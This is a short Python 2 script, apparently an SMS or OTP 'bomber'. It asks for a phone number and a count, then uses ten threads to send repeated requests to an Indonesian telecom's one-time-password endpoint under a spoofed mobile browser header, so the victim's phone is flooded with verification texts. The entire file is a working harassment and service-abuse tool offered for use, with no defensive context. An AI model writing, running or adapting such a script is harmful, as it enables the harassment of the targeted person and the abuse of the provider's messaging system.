import requests,time
from multiprocessing.pool import ThreadPool
uag = {'User-Agent':"Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}
a=0

def spam(msisdn):
   while True:
    try:
     global a
     b=requests.post("https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp",data={"type":"hp","msisdn":msisdn},headers=uag).json()
     time.sleep(.5)
     if b["code"] == "0":
        a-=-1
        print ("\r[{}] Spam Sended!".format(a))
        break

#     else:
#        print b

    except Exception as e:
     print e

no=raw_input("No (08) : ")
aa=[]
for i in range(int(raw_input("Jumlah : "))):
    aa.append(no)

tp=ThreadPool(10)
tp.map(spam,aa)

